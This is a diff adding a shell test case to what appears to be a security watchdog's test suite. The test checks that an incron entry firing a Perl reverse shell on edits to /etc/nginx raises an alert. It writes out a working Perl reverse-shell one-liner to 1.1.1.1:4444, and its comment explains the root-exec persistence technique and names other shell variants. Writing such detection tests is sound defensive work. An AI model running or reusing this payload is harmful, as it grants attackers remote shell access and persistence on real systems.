@@ -271,3 +271,19 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on incron command surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp incron command
+    # rev-shell variants already locked. Perl is on every Debian/
+    # Ubuntu host as dpkg/locale dependency. Locks perl axis on
+    # T1546 incron inotify-event-trigger root-exec persistence —
+    # attacker plants watch on routinely-modified file (e.g.
+    # /etc/nginx, /var/log/auth.log) to fire planted perl rev-shell
+    # on every operator-config-touch.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '/etc/nginx IN_MODIFY perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${TAB}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
